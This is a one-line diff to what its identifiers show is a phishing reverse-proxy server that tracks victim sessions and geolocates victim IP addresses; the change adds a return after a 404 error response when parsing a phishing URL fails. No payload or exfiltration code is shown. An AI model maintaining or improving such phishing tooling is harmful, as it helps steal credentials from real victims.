@@ -294,6 +294,7 @@ getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
             displayError("Phishing URL parsing failed", error, url);
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+            return;
         }
     }
      // ---- Serve the client script regardless of session ----
